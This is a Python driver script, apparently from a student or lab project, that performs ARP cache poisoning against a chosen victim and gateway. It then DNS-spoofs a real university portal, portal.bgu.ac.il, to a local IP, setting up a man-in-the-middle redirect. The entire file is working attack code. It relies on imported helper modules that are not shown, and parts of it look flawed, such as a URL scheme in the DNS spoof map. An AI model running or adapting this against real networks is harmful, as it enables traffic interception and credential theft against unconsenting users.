import argparse
from ARP_spoofing import *
from dns_spoofing import *

def main():
    parser = argparse.ArgumentParser(description='ARP spoof script')
    parser.add_argument("-g", '--gateway_ip', help='Host IP address')
    parser.add_argument("-v", '--victim_ip', help='Victim IP address')
    args = parser.parse_args()

    host_mac = get_mac_address(args.gateway_ip)
    victim_mac = get_mac_address(args.victim_ip)
    print('Starting ARP poisoning')
    ip_route("1")
    try:
        while True:
            arp_poisoning(host_mac, args.gateway_ip, args.victim_ip)
            arp_poisoning(victim_mac, args.victim_ip, args.gateway_ip)
            time.sleep(2)
            HostDict = {
                b"https://portal.bgu.ac.il": "10.0.0.138"
            }
            queueNum = 1
            print('Starting DNS spoofing')
            snoof = dns_spoofing(HostDict, queueNum)
            snoof()
    except KeyboardInterrupt:
        print('ARP spoofing stopped, Restoring network')
        ip_route("0")
        restore(victim_mac, host_mac, args.victim_ip, args.gateway_ip)
        restore(victim_mac, host_mac, args.gateway_ip, args.victim_ip)
        print('Network restored')


if __name__ == '__main__':
    main()
